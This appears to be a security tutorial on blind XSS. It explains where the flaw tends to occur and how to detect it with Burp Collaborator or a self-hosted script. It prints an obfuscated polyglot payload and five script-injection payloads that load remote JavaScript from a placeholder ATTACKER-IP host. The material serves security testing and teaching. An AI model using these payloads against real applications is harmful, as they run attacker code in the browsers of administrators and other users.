Blind XSS vulnerabilities are a variant of stored XSS vulnerabilities. They occur when an attacker input is saved in the database and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded.

Other example of web applications or pages where blind XSS may occur:
- Log viewers
- Exception handlers
- Chat applications / forums
- Customer ticket applications
- Product reviews
- Any application that requires user moderation by certain users (e.g Admins)
## Detection
To test for blind XSS vulnerabilities, attackers can use out-of-band techniques with the Burp Collaborator server or using their own custom script.
## Burp Collaborator
1. Right-click the request you want to investigate and select Send to Repeater.
2. In the Repeater tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/BURP-COLLABORATOR-SUBDOMAIN/).slice(2), document.documentElement.appendChild(s))//'>`.
3. Click Send.
## Custom Remote Script
An attacker can create their own custom script and host it on a server they own. Once a custom script is available, an attacker can start a listener using `netcat` or `php` or `python`.

With that, an attacker can start testing various XSS payloads that load a remote script and see which of them sends a request. The following are a few examples from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss).
1. `<script src=http://ATTACKER-IP/script-fieldname.js></script>`
2. `'><script src=http://ATTACKER-IP/script-fieldname.js></script>`
3. `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER-IP/script-fieldname.js\';document.body.appendChild(a)')`
4. `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ATTACKER-IP/script-fieldname.js");a.send();</script>`
5. `<script>$.getScript("http://ATTACKER-IP/script-fieldname.js")</script>`
